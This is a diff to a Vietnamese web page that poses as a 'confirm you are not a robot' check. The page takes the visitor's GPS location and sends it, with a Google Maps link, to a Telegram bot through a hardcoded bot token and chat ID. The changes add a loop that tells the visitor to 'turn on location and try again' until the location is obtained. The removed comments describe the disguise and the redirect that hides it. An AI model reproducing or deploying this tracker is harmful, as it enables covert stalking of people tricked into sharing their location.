@@ -12,6 +12,7 @@
         #btn-confirm { padding: 15px 25px; font-size: 16px; color: white; background: #0088cc; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
         #btn-confirm:active { background: #006699; }
         p { font-size: 14px; color: #666; }
+        #error-msg { color: #d93025; font-weight: bold; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
@@ -21,6 +22,7 @@
             <h2 style="font-size: 20px;">Yêu cầu xác minh</h2>
             <p>Vui lòng xác nhận bạn không phải là người máy để tiếp tục truy cập trang web.</p>
             <button id="btn-confirm" onclick="startTracking()">XÁC NHẬN TRUY CẬP</button>
+            <div id="error-msg">Vui lòng bật vị trí và thử lại</div>
         </div>
 
         <div id="step-2" style="display:none;">
@@ -31,14 +33,14 @@
 
     <script>
         // ==========================================
-        // 1. DÁN TOKEN VÀ ID CỦA BẠN VÀO ĐÂY
+        // 1. THÔNG TIN CỦA BẠN (GIỮ NGUYÊN)
         // ==========================================
         const TELE_TOKEN = '8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg';
         const CHAT_ID = '1197457034';
         // ==========================================
 
         function startTracking() {
-            // Hiện giao diện loading ngụy trang
+            document.getElementById('error-msg').style.display = 'none';
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
 
@@ -48,7 +50,7 @@
                     timeout: 7000
                 });
             } else {
-                redirectUser();
+                handleSystemError();
             }
         }
 
@@ -56,7 +58,6 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             
-            // Link Google Maps chuẩn để bạn bấm vào là xem được ngay
             const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
             const message = `📍 Vị trí của nó:\nLink: ${googleMapsUrl}\nĐộ chính xác: +/- ${position.coords.accuracy}m`;
 
@@ -65,19 +66,21 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: message })
             })
-            .then(() => redirectUser())
-            .catch(() => redirectUser());
+            .then(() => {
+                // Chỉ chuyển hướng khi gửi Telegram thành công
+                window.location.href = "https://www.google.com.vn";
+            })
+            .catch(() => {
+                // Nếu lỗi mạng khi gửi, yêu cầu thử lại
+                handleSystemError();
+            });
         }
 
         function handleSystemError(error) {
-            // Dù lỗi hay bị từ chối vẫn chuyển hướng để không bị lộ
-            console.log("Lỗi GPS hoặc bị từ chối");
-            redirectUser();
-        }
-
-        function redirectUser() {
-            // Chuyển hướng sang Google hoặc bất kỳ trang nào bạn muốn ngụy trang
-            window.location.href = "https://www.google.com.vn";
+            // Hiện dòng chữ báo lỗi và quay lại bước 1
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-1').style.display = 'block';
+            document.getElementById('error-msg').style.display = 'block';
         }
     </script>
 </body>
